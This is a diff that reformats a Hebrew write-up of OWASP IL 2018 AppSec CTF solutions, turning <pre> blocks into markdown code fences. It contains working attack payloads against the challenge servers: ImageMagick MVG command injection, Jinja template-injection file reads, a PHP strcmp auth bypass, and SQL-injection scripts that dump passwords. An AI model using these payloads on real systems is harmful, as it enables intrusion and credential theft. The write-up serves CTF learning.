@@ -1,10 +1,4 @@
-<html>
-<head>
-<meta http-equiv=Content-Type content="text/html; charset=windows-1255">
-<meta name=Generator content="Microsoft Word 15 (filtered)">
-</head>
-<body lang=en-IL link=blue vlink="#954F72">
-<div class=WordSection1>
+
 <h1 align=center dir=RTL style='text-align:center;direction:rtl;unicode-bidi:
 embed'><span lang=HE style='font-family:"Times New Roman",serif'>פתרון - </span><span
 lang=en-IL dir=LTR>OWASP IL 2018 AppSec CTF</span></h1>
@@ -305,13 +299,15 @@ height=214 id="Picture 21" src="images/image020.jpg"></span></p>
 <p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
 embed'><span lang=HE style='font-family:"Arial",sans-serif'>בדיקה של קוד המקור
 של האתר מגלה את הקוד החשוד הבא:</span></p>
-<pre>
+
+```html
     <script src="./exif-js/exif.js"></script>
  
     <script>
         eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('7(0(){9},c);"e 4";5.6=1;0 1(){8 a=b.3("d");2.f(a,0(){g(h(2.i(j,"k").l("").m().n("")))})}',24,24,'function|getExif|EXIF|getElementById|strict|window|onload|setInterval|var|debugger||document|100|profileImage|use|getData|eval|atob|getTag|this|Model|split|reverse|join'.split('|'),0,{}))
     </script>
-</pre>
+```
+
 <p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
 embed'><span lang=HE style='font-family:"Arial",sans-serif'>את הקוד אפשר לפענח
 בעזרת ה-</span><span class=MsoHyperlink><span lang=EN-US><a
@@ -319,7 +315,8 @@ href="http://matthewfl.com/unPacker.html"><span dir=LTR>Unpacker</span><span
 dir=RTL></span><span lang=HE style='font-family:"Arial",sans-serif'><span
 dir=RTL></span> הזה</span></a></span></span><span lang=HE style='font-family:
 "Arial",sans-serif'>, למשל:</span></p>
-<pre>
+
+```javascript
 setInterval(function(){debugger},100);
 "use strict";
 window.onload=getExif;
@@ -328,7 +325,8 @@ function getExif(){
      EXIF.getData(a,function(){ eval(atob(EXIF.getTag(this,"Model")
 .split("").reverse().join("")))})
 }
-</pre>
+```
+
 <p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
 embed'><span lang=HE style='font-family:"Arial",sans-serif'>כלומר, הפונקציה
 מריצה קוד שמופיע ב-</span><span lang=EN-US dir=LTR>metadata</span><span
@@ -356,7 +354,8 @@ dir=RTL></span>).</span></p>
 embed'><span lang=HE style='font-family:"Arial",sans-serif'>שוב נשתמש ב-</span><span
 lang=EN-US dir=LTR>Unpacker</span><span dir=RTL></span><span lang=HE
 style='font-family:"Arial",sans-serif'><span dir=RTL></span> ונקבל:</span></p>
-<pre>
+
+```javascript
 function verify(a)
      {
 if(a.charCodeAt(0x0)=="79"&&a.charCodeAt(0x1)=="87"&&a.charCodeAt(0x2)=="65"&&a.charCodeAt(0x3)=="83"&&a.charCodeAt(0x4)=="80"&&a.charCodeAt(0x5)=="45"&&a.charCodeAt(0x6)=="73"&&a.charCodeAt(0x7)=="76"&&a.charCodeAt(0x8)=="123"&&a.charCodeAt(0x9)=="74"&&a.charCodeAt(0xa)=="52"&&a.charCodeAt(0xb)=="118"&&a.charCodeAt(0xc)=="52"&&a.charCodeAt(0xd)=="83"&&a.charCodeAt(0xe)=="99"&&a.charCodeAt(0xf)=="114"&&a.charCodeAt(0x10)=="49"&&a.charCodeAt(0x11)=="112"&&a.charCodeAt(0x12)=="116"&&a.charCodeAt(0x13)=="78"&&a.charCodeAt(0x14)=="105"&&a.charCodeAt(0x15)=="110"&&a.charCodeAt(0x16)=="106"&&a.charCodeAt(0x17)=="52"&&a.charCodeAt(0x18)=="33"&&a.charCodeAt(0x19)=="125")
@@ -368,11 +367,13 @@ if(a.charCodeAt(0x0)=="79"&&a.charCodeAt(0x1)=="87"&&a.charCodeAt(0x2)=="65"&&a.
            console.log("You are so wrong.. :)")
      }
 }
-</pre>
+```
+
 <p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
 embed'><span lang=HE style='font-family:"Arial",sans-serif'>הלוגיקה פה מספיק
 קצרה וברורה בשביל שיהיה קל לייצר קוד ידני שמגלה מהו הדגל, למשל:</span></p>
-<pre>
+
+```javascript
 a = Array();
 a[0x0]="79"; a[0x1]="87"; a[0x2]="65"; a[0x3]="83"; a[0x4]="80"; a[0x5]="45"; a[0x6]="73"; a[0x7]="76"; a[0x8]="123"; a[0x9]="74"; a[0xa]="52"; a[0xb]="118"; a[0xc]="52"; a[0xd]="83"; a[0xe]="99"; a[0xf]="114"; a[0x10]="49"; a[0x11]="112"; a[0x12]="116"; a[0x13]="78"; a[0x14]="105"; a[0x15]="110"; a[0x16]="106"; a[0x17]="52"; a[0x18]="33"; a[0x19]="125";
 s = "";
@@ -380,7 +381,8 @@ for (var i in a) {
     s += String.fromCharCode(a[i]);
 }
 console.log(s);
-</pre>
+```
+
 <p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
 embed'><span lang=HE style='font-family:"Arial",sans-serif'>הדגל הוא:</span></p>
 <p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
@@ -430,14 +432,15 @@ dir=RTL></span> התמודדה איתו בצורה טובה יחסית. מדי �
 דקה, אך לא הייתה דרישה לרצף פענוחים כלשהו).</span></p>
 <p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
 embed'><span lang=HE style='font-family:"Arial",sans-serif'>הקוד:</span></p>
-<pre>
+
+```python
 from PIL import Image
 import pytesseract
 import requests
  
 CAPTCHA_BASE_URL = 'http://challenges.owaspil.ctf.today:8088'
 with requests.Session() as s:
-     for i in range(45):
+    for i in range(45):
            print ("-" * 15)
            print (i)
            url = CAPTCHA_BASE_URL + '/captcha.php'
@@ -452,7 +455,8 @@ with requests.Session() as s:
            if "flag" in response.text:
                 print (response.text)
                 break
-</pre>
+```
+
 <p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
 embed'><span lang=HE style='font-family:"Arial",sans-serif'>הדגל:</span></p>
 <p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
@@ -503,11 +507,13 @@ embed'><span lang=HE style='font-family:"Arial",sans-serif'>ראשית צריך 
 <p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
 embed'><span lang=HE style='font-family:"Arial",sans-serif'>הרשימה שמצאתי הייתה
 בנויה בפורמט הבא:</span></p>
-<pre>
+
+```
 201.20.99.10:3130     Brazil
 90.161.42.152:40057   Spain
 92.38.45.57:42273     Russia
-</pre>
+```
+
 <p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
 embed'><span lang=HE style='font-family:"Arial",sans-serif'>&nbsp;</span></p>
 <p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
@@ -519,7 +525,8 @@ dir=LTR>HTTP</span><span dir=RTL></span><span lang=HE style='font-family:"Arial"
 dir=RTL></span>.</span></p>
 <p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
 embed'><span lang=HE style='font-family:"Arial",sans-serif'>הקוד:</span></p>
-<pre>
+
+```python
 import requests, re
  
 ip_table = {}
@@ -547,7 +554,8 @@ while "OWASP" not in text:
         print("No match for {}!".format(r.text))
         break
  
-</pre>
+```
+
 <p class=MsoNormal style='margin-bottom:0cm;margin-bottom:.0001pt'><span
 lang=EN-US style='font-size:10.0pt;line-height:107%;font-family:"Courier New"'>&nbsp;</span></p>
 <p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
@@ -693,12 +701,14 @@ embed'><span lang=HE style='font-family:"Arial",sans-serif'>נייצר קובץ 
 lang=EN-US dir=LTR>MVG</span><span dir=RTL></span><span lang=HE
 style='font-family:"Arial",sans-serif'><span dir=RTL></span> זדוני לפי ההוראות,
 ונעלה לאתר:</span></p>
-<pre>
+
+```svg
 push graphic-context
 viewbox 0 0 640 480
 fill 'url(https://example.com/image.jpg"|ls -la>/tmp/e1.txt;")'
 pop graphic-context
-</pre>
+```
+
 <p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
 embed'><span lang=HE style='font-family:"Arial",sans-serif'>&nbsp;</span></p>
 <p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
@@ -717,14 +727,16 @@ dir=RTL></span> </span><span lang=HE style='font-family:"Arial",sans-serif'>(ש�
 באמצעות החולשה) מתוך תיקיית </span><span lang=EN-US dir=LTR>uploads</span><span
 dir=RTL></span><span lang=HE style='font-family:"Arial",sans-serif'><span
 dir=RTL></span>, נקבל את התוכן שרצינו:</span></p>
-<pre>
+
+```
 total 20
 dr-xr-xr-x 1 root root 4096 Aug 29 13:52 .
 drwxr-xr-x 1 root root 4096 Aug 29 13:52 ..
 -r-xr-xr-x 1 root root 3663 Aug 27 10:40 app.py
 -r-xr-xr-x 1 root root   14 Aug 27 10:40 requirements.txt
 dr-xr-xr-x 1 root root 4096 Aug 29 13:52 templates
-</pre>
+```
+
 <p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
 embed'><span lang=HE style='font-family:"Arial",sans-serif'>&nbsp;</span></p>
 <p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
@@ -732,12 +744,14 @@ embed'><span lang=HE style='font-family:"Arial",sans-serif'>כעת ניתן לק
 הקובץ </span><span lang=EN-US dir=LTR>app.py</span><span dir=RTL></span><span
 lang=HE style='font-family:"Arial",sans-serif'><span dir=RTL></span>, למשל, </span><span
 lang=HE style='font-family:"Arial",sans-serif'>בעזרת פקודה אחרת:</span></p>
-<pre>
+
+```svg
 push graphic-context
 viewbox 0 0 640 480
 image over 0,0 0,0 'label:@app.py'
 pop graphic-context
-</pre>
+```
+
 <p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
 embed'><span lang=HE style='font-family:"Arial",sans-serif'>&nbsp;</span></p>
 <p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
@@ -758,12 +772,14 @@ dir=RTL></span>, ולכן אפשר להשתמש בשיטה הראשונה כדי
 <p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
 embed'><span lang=HE style='font-family:"Arial",sans-serif'>כעת ננסה לסייר בעץ
 התיקיות באמצעות הפקודה הבאה:</span></p>
-<pre>
+
+```svg
 push graphic-context
 viewbox 0 0 640 480
 fill 'url(https://example.com/image.jpg"|ls -alR />/tmp/e2.txt;")'
 pop graphic-context
-</pre>
+```
+
 <p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
 embed'><span lang=HE style='font-family:"Arial",sans-serif'>&nbsp;</span></p>
 <p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
@@ -773,7 +789,8 @@ embed'><span lang=HE style='font-family:"Arial",sans-serif'>התוצאה היא 
 embed'><span lang=HE style='font-family:"Arial",sans-serif'>&nbsp;</span></p>
 <p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
 embed'><span lang=HE style='font-family:"Arial",sans-serif'>למשל:</span></p>
-<pre>
+
+```
 /:
 total 1208
 drwxr-xr-x   1 root root    4096 Aug 29 13:52 .
@@ -808,7 +825,8 @@ drwxr-xr-x 1 root root 4096 Aug 29 13:52 ..
 -r-xr-xr-x 1 root root 3663 Aug 27 10:40 app.py
 -r-xr-xr-x 1 root root   14 Aug 27 10:40 requirements.txt
 dr-xr-xr-x 1 root root 4096 Aug 29 13:52 templates
-</pre>
+```
+
 <p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
 embed'><span lang=en-IL dir=LTR>&nbsp;</span></p>
 <p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
@@ -916,8 +934,12 @@ lang=HE style='font-family:"Arial",sans-serif'>, שבו אפשר למצוא מש
 <p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
 embed'><span lang=HE style='font-family:"Arial",sans-serif'>ממעבר זריז על הקוד,
 קפצה לי לעין הפקודה הבאה (בעיקר בגלל ההדפסה):</span></p>
-<pre>raise Exception("Division by 0 kills baby whales (occured at index " +
-                        str(div_index) + ")")</pre>
+
+```python
+raise Exception("Division by 0 kills baby whales (occured at index " +
+                        str(div_index) + ")")
+```
+
 <p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
 embed'><span lang=HE style='font-family:"Arial",sans-serif'>זה נשמע כמו משהו
 שכדאי לנסות.</span></p>
@@ -979,7 +1001,8 @@ embed'><span lang=HE style='font-family:"Arial",sans-serif'>פתרון:</span></
 <p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
 embed'><span lang=HE style='font-family:"Arial",sans-serif'>החלק היחיד שמעניין
 בקוד הוא הקטע הבא:</span></p>
-<pre>
+
+```php
 <?php
 require_once('config.php');
  
@@ -993,7 +1016,8 @@ if (check_param('username') && strcmp($AUTH_USER, $_POST['username']) == 0 && ch
     exit();
 }
 ?>
-</pre>
+```
+
 <p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
 embed'><span lang=HE style='font-family:"Arial",sans-serif'>במבט ראשון, אנחנו
 צריכים לספק שם משתמש וסיסמא (האתר מחשב </span><span lang=EN-US dir=LTR>MD5</span><span
@@ -1016,7 +1040,8 @@ href="http://php.net/manual/en/function.strcmp.php"><span lang=HE
 style='font-family:"Arial",sans-serif'>תיעוד של </span><span dir=LTR>strcmp</span></a></span></span><span
 dir=RTL></span><span lang=HE style='font-family:"Arial",sans-serif'><span
 dir=RTL></span> ומצאתי את ההערה הבאה מועילה במיוחד:</span></p>
-<pre>
+
+```
 <?php
 if (strcmp($_POST['password'], 'sekret') == 0) {
     echo "Welcome, authorized user!\n";
@@ -1031,18 +1056,21 @@ Go away, imposter.
 $ curl -d password[]=wrong http://andersk.scripts.mit.edu/strcmp.php
 Welcome, authorized user!
  
-</pre>
+```
+
 <p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
 embed'><span lang=HE style='font-family:"Arial",sans-serif'>&nbsp;</span></p>
 <p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
 embed'><span lang=HE style='font-family:"Arial",sans-serif'>&nbsp;</span></p>
 <p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
 embed'><span lang=HE style='font-family:"Arial",sans-serif'>נראה מתאים.</span></p>
-<pre>
+
+```python
 import requests
 r = requests.post('http://challenges.owaspil.ctf.today:8082/login.php', data = {"username[]": "a", "md5[]": "a"})
 print (r.text)
-</pre>
+```
+
 <p class=MsoNormal style='margin-bottom:0cm;margin-bottom:.0001pt'><span
 lang=EN-US style='font-family:"Courier New"'>&nbsp;</span></p>
 <p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
@@ -1228,14 +1256,26 @@ embed'><span lang=HE style='font-family:"Arial",sans-serif'>&nbsp;</span></p>
 embed'><span lang=HE style='font-family:"Arial",sans-serif'>מפה אפשר להריץ כבר
 פקודות של </span><span lang=EN-US dir=LTR>OS</span><span dir=RTL></span><span
 lang=HE style='font-family:"Arial",sans-serif'><span dir=RTL></span>, למשל:</span></p>
-<pre>{{''.__class__.mro()[2].__subclasses__()[59].__init__.func_globals['linecache'].__dict__['os'].listdir('.')}}</pre>
+
+```python
+{{''.__class__.mro()[2].__subclasses__()[59].__init__.func_globals['linecache'].__dict__['os'].listdir('.')}}
+```
+
 <p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
 embed'><span lang=HE style='font-family:"Arial",sans-serif'>מציג:</span></p>
-<pre>['templates', 'app.py', 'requirements.txt']</pre>
+
+```
+['templates', 'app.py', 'requirements.txt']
+```
+
 <p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
 embed'><span lang=HE style='font-family:"Arial",sans-serif'>באופן דומה (עם נתיב
 קצת שונה), הרצת:</span></p>
-<pre>{{''.__class__.mro()[2].__subclasses__()[59]()._module.__builtins__['open']('app.py').read()}}</pre>
+
+```python
+{{''.__class__.mro()[2].__subclasses__()[59]()._module.__builtins__['open']('app.py').read()}}
+```
+
 <p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
 embed'><span lang=HE style='font-family:"Arial",sans-serif'>תפלוט את התוכן של </span><span
 lang=EN-US dir=LTR>app.py</span><span dir=RTL></span><span lang=HE
@@ -1243,7 +1283,8 @@ style='font-family:"Arial",sans-serif'><span dir=RTL></span>.</span></p>
 <p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
 embed'><span lang=HE style='font-family:"Arial",sans-serif'>מפה צריך פשוט למצוא
 את הקובץ המתאים:</span></p>
-<pre>
+
+```python
 req = "{{"
 req += "''"
 req += ".__class__.mro()[2]"
@@ -1271,7 +1312,8 @@ req += "}}"
  
 r = requests.get("http://challenges.owaspil.ctf.today:8087/get_recommendation?name=a&recommender=" + req)
 print (r.text)
-</pre>
+```
+
 <p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
 embed'><span lang=EN-US dir=LTR>&nbsp;</span></p>
 <p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
@@ -1309,7 +1351,8 @@ from Brazil (You served from Israel)| Counter: 0/16</span></p>
 <p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
 embed'><span lang=HE style='font-family:"Arial",sans-serif'>המימוש מאוד דומה
 לתרגיל המקורי:</span></p>
-<pre>
+
+```python
 import requests, re
  
 ip_table = {}
@@ -1352,7 +1395,8 @@ while "OWASP" not in text:
         print ("No match for '{}'".format(text))
         break
 print (text)
-</pre>
+```
+
 <p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
 embed'><span lang=HE style='font-family:"Arial",sans-serif'>&nbsp;</span></p>
 <p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
@@ -1523,7 +1567,8 @@ dir=RTL></span> ולהתעלם מכל החלק הימני. לאחר מכן, הפ
 <p class=MsoNormal dir=RTL style='margin-bottom:0cm;margin-bottom:.0001pt;
 text-align:right;direction:rtl;unicode-bidi:embed'><span lang=HE
 style='font-family:"Arial",sans-serif'>הקוד עצמו נראה כך:</span></p>
-<pre>
+
+```python
 def get_image_bounding_box(img):
     w, h = img.size
     return (3, 6, w - 28, h - 2)
@@ -1547,7 +1592,8 @@ def filter_image(in_file):
                 m[x,y] = WHITE
  
     return (img, num_black_pixels)
-</pre>
+```
+
 <p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
 embed'><span lang=HE style='font-family:"Arial",sans-serif'>שימו לב שבנוסף
 ללוגיקה שפורטה קודם, הקוד סופר פיקסלים שחורים (מקוריים, לפני השינוי) בתמונה
@@ -1599,7 +1645,8 @@ embed'><span lang=HE style='font-family:"Arial",sans-serif'>אם ביצענו א
 <p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
 embed'><span lang=HE style='font-family:"Arial",sans-serif'>הקוד של הפונקציה
 העיקרית במקרה הזה הוא:</span></p>
-<pre>
+
+```python
 with requests.Session() as s:
     with open(DEBUG_FILENAME, "w") as debug_file:
         for i in range(NUM_ATTEMPTS):
@@ -1642,7 +1689,8 @@ with requests.Session() as s:
             solved_captchas_match = solved_regex.search(response.text)
             if solved_captchas_match:
                 print ("Solved: {}".format(solved_captchas_match.group(1)))
-</pre>
+```
+
 <p class=MsoNormal style='margin-bottom:0cm;margin-bottom:.0001pt'><span
 lang=HE dir=RTL style='font-size:9.0pt;line-height:107%;font-family:"Courier New"'>&nbsp;</span></p>
 <p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
@@ -1717,20 +1765,26 @@ embed'><span lang=HE style='font-family:"Arial",sans-serif'>לשם השלמות,
 <p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
 embed'><span lang=HE style='font-family:"Arial",sans-serif'>הפונקציה לקבלת
 הניחוש:</span></p>
-<pre>
+
+```python
 def get_guess(img):
     guess = pytesseract.image_to_string(img, config=r'--psm 8').encode("utf-8")
     guess = guess.translate(SIMILAR_LETTERS_TRANS)
     guess = guess.translate(None, '?.,_ |')
     return guess
-</pre>
+```
+
 <p class=MsoNormal><span lang=EN-US>&nbsp;</span></p>
 <p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
 embed'><span lang=HE style='font-family:"Arial",sans-serif'>מלבד הקריאה ל-</span><span
 lang=EN-US dir=LTR>OCR</span><span dir=RTL></span><span lang=HE
 style='font-family:"Arial",sans-serif'><span dir=RTL></span> עצמו, הפונקציה גם
 מבצעת עיבוד נוסף לתשובה באמצעות המילון הבא:</span></p>
-<pre>SIMILAR_LETTERS_TRANS = string.maketrans(&quot;IOYSBFZXCVMKWUJD0]?&quot;, &quot;lo958fzxcvmkwuj5ol7&quot;)</pre>
+
+```python
+SIMILAR_LETTERS_TRANS = string.maketrans(&quot;IOYSBFZXCVMKWUJD0]?&quot;, &quot;lo958fzxcvmkwuj5ol7&quot;)
+```
+
 <p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
 embed'><span lang=HE style='font-family:"Arial",sans-serif'>העיבוד הזה נדרש
 בגלל באג בגרסאות החדשות של </span><span lang=EN-US dir=LTR>Tesseract</span><span
@@ -1748,7 +1802,8 @@ lang=EN-US dir=LTR>b</span><span dir=RTL></span><span lang=HE style='font-family
 <p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
 embed'><span lang=HE style='font-family:"Arial",sans-serif'>ולסיום, הקוד לפתרון
 המשוואה החשבונית:</span></p>
-<pre>
+
+```python
 def get_math_captcha_answer():
     operation = {'+': operator.add, '-': operator.sub, '*': operator.mul}
     r = s.get(URL)
@@ -1757,7 +1812,8 @@ def get_math_captcha_answer():
         return operation[match.group(2)](int(match.group(1)), int(match.group(3)))
     except Exception as e:
         raise Exception("Error attempting to solve math! ({})".format(str(e)))
-</pre>
+```
+
 <p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
 embed'><span lang=HE style='font-family:"Arial",sans-serif'>&nbsp;</span></p>
 <p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
@@ -1804,6 +1860,9 @@ embed'><span lang=HE style='font-family:"Arial",sans-serif'>כשהסתכלתי �
 המטושטש של הרמז, המילה השנייה נראתה לי מאוד כמו </span><span lang=EN-US
 dir=LTR>flags</span><span dir=RTL></span><span lang=HE style='font-family:"Arial",sans-serif'><span
 dir=RTL></span>, וזה הסתדר מצוין עם קוד המקור של האתר:</span></p>
+
+
+
 <pre><span lang=en-IL>&nbsp;</span></pre><pre><span lang=en-IL>&lt;<span
 class=start-tag>div</span> <span class=attribute-name>class</span>=&quot;col-lg-1 col-sm-2 col-xs-4&quot;&gt;</span></pre><pre><span
 lang=en-IL> </span><span lang=en-IL>&lt;<span class=start-tag>p</span> <span
@@ -1835,6 +1894,8 @@ class=attribute-name>width</span>=&quot;100%&quot; <span class=attribute-name>al
 class=start-tag>br</span>&gt;ARMENIA&lt;/<span class=end-tag>a</span>&gt;&lt;/<span
 class=end-tag>p</span>&gt;</span></pre><pre><span lang=en-IL>&lt;/<span
 class=end-tag>div</span>&gt;</span></pre>
+
+
 <p class=MsoNormal><span lang=en-IL>&nbsp;</span></p>
 <p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
 embed'><span lang=HE style='font-family:"Arial",sans-serif'>אם כך, המילה השלישית
@@ -1876,6 +1937,9 @@ embed'><span lang=HE style='font-family:"Arial",sans-serif'>איך היה אפש
 את הקישור הזה לפני הרמז? הוא היחיד שמופיע ללא סיומת </span><span lang=EN-US
 dir=LTR>PNG</span><span dir=RTL></span><span lang=HE style='font-family:"Arial",sans-serif'><span
 dir=RTL></span>:</span></p>
+
+<pre><code><span lang=en-IL>&nbsp;</span></code></pre>
+
 <pre><span lang=en-IL>&nbsp;</span></pre><pre><span lang=en-IL
 style='font-size:8.0pt'>&lt;<span class=start-tag>div</span> <span
 class=attribute-name>class</span>=&quot;col-lg-1 col-sm-2 col-xs-4&quot;&gt;</span></pre><pre><span
@@ -1910,6 +1974,7 @@ class=attribute-name>width</span>=&quot;100%&quot; <span class=attribute-name>al
 class=start-tag>br</span>&gt;NETHERLANDS ANTILLES&lt;/<span class=end-tag>a</span>&gt;&lt;/<span
 class=end-tag>p</span>&gt;</span></pre><pre><span lang=en-IL style='font-size:
 8.0pt'>&lt;/<span class=end-tag>div</span>&gt;</span></pre>
+
 <p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
 embed'><span lang=HE style='font-family:"Arial",sans-serif'>כנראה בגלל
 ה&quot;רמאות&quot; הזאת, הקארמה התנקמה בי והחלק השני לקח לי שעות על גבי שעות.</span></p>
@@ -1976,7 +2041,8 @@ embed'><span lang=HE style='font-family:"Arial",sans-serif'>אפשר לבחון 
 lang=HE style='font-family:"Arial",sans-serif'><span dir=RTL></span> במצב </span><span
 lang=EN-US dir=LTR>Verbose</span><span dir=RTL></span><span lang=HE
 style='font-family:"Arial",sans-serif'><span dir=RTL></span>:</span></p>
-<pre>
+
+```bash
 root@kali:/media/sf_CTFs/owasp_il/flags# curl -v -k https://challenges.owaspil.ctf.today:8443/flags/NetherlandsAntilles-flags-cat
 *   Trying 52.47.109.181...
 * TCP_NODELAY set
@@ -2019,7 +2085,8 @@ root@kali:/media/sf_CTFs/owasp_il/flags# curl -v -k https://challenges.owaspil.c
 <
 * Connection #0 to host challenges.owaspil.ctf.today left intact
 Look closely.. you just received it :)
-</pre>
+```
+
 <p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
 embed'><span lang=EN-US dir=LTR>&nbsp;</span></p>
 <p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
@@ -2030,7 +2097,8 @@ embed'><span lang=HE style='font-family:"Arial",sans-serif'>ה-</span><span
 lang=EN-US dir=LTR>Certificate</span><span dir=RTL></span><span lang=HE
 style='font-family:"Arial",sans-serif'><span dir=RTL></span> שנשלח מהשרת הוא
 מקום הגיוני להחביא בו מידע, לכן שמרתי אותו ועברתי עליו:</span></p>
-<pre>
+
+```bash
 root@kali:/media/sf_CTFs/owasp_il/flags# openssl x509 -in 1.cer -inform der -text -noout
 Certificate:
     Data:
@@ -2066,7 +2134,8 @@ Certificate:
          6b:ab:aa:a4:dc:c7:e0:80:24:aa:74:94:45:37:18:86:e6:c4:
          aa:39:dd:00:cd:f5:da:46:d0:72:84:8a:1e:2f:87:83:a8:b3:
          08:c1
-</pre>
+```
+
 <p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
 embed'><span lang=HE style='font-family:"Arial",sans-serif'>&nbsp;</span></p>
 <p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
@@ -2361,7 +2430,8 @@ embed'><span lang=EN-US dir=LTR>&nbsp;</span></p>
 <p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
 embed'><span lang=HE style='font-family:"Arial",sans-serif'>התוצאות הבולטות
 היו:</span></p>
-<pre>
+
+```
 --------------------
 and(true)like(false)union(select(pass)from(users))#
 SQL error: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'and(true)like(false)union(select(pass)from(users)) LIMIT 1' at line 1
@@ -2389,7 +2459,8 @@ updatexml(0,concat(0xa,user()),0)
 SQL error: XPATH syntax error: '
 OWASP_IL@172.18.0.2'
 --------------------
-</pre>
+```
+
 <p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
 embed'><span lang=HE style='font-family:"Arial",sans-serif'>אפשר לראות שני
 דברים מעניינים:</span></p>
@@ -2532,24 +2603,28 @@ embed'><span lang=HE style='font-family:"Arial",sans-serif'>&nbsp;</span></p>
 <p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
 embed'><span lang=HE style='font-family:"Arial",sans-serif'>כלומר, אם נריץ את
 הסקריפט הבא, נקבל את הסיסמאות של כל המשתמשים:</span></p>
-<pre>
+
+```python
 for i in range(30):
     sql = "extractvalue(floor(0),concat(0x0a,(select(password)from(employees)where(id)like({}))))".format(i)
     r = requests.get("http://challenges.owaspil.ctf.today:8081/profile.php?id={}".format(sql))
     print ("{}: {}".format(i, r.text))
-</pre>
+```
+
 <p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
 embed'><span lang=en-IL dir=LTR>&nbsp;</span></p>
 <p class=MsoNormal dir=RTL style='margin-bottom:0cm;margin-bottom:.0001pt;
 text-align:right;direction:rtl;unicode-bidi:embed'><span lang=HE
 style='font-family:"Arial",sans-serif'>החלק המעניין של התוצאה:</span></p>
-<pre>
+
+```
 11: SQL error: XPATH syntax error: 'pippen'
 12: SQL error: XPATH syntax error: 'icu812'
 13: SQL error: XPATH syntax error: 'OWASP-IL{I_Am_The_WAF_Bypass_Ma'
 14: SQL error: XPATH syntax error: 'alfredo'
 15: SQL error: XPATH syntax error: 'stanley'
-</pre>
+```
+
 <p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
 embed'><span lang=EN-US dir=LTR>&nbsp;</span></p>
 <p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
